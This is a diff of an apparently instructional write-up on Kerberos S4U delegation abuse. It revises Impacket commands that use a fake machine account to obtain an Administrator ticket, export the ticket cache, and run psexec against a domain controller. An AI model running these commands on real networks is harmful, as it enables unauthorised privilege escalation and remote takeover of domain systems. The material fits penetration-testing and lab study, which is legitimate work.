@@ -52,9 +52,9 @@ The next stage uses Kerberos S4U extensions:
 Using Impacket:
 
 ```bash
-getST.py -spn cifs/TARGETDC.domain.local \
--impersonate Administrator \
-domain.local/fakecomp$:'Password@123'
+impacket-getST -spn cifs/TARGETDC.domain.local \
+domain.local/fakecomp$:'Password@123' \
+-impersonate Administrator -dc-ip DC_IP
 ```
 
 This generates a `.ccache` ticket representing the Administrator session.
@@ -66,13 +66,13 @@ This generates a `.ccache` ticket representing the Administrator session.
 The ticket is exported into the Kerberos environment:
 
 ```bash
-export KRB5CCNAME=Administrator.ccache
+export KRB5CCNAME=$(pwd)/Administrator.ccache
 ```
 
 Then used for remote execution:
 
 ```bash
-impacket-psexec -k -no-pass domain.local/Administrator@TARGETDC.domain.local
+impacket-psexec -k -no-pass TARGETDC.domain.local -dc-ip DC_IP
 ```
 
 At this point, authentication is fully Kerberos-based and no password is required.
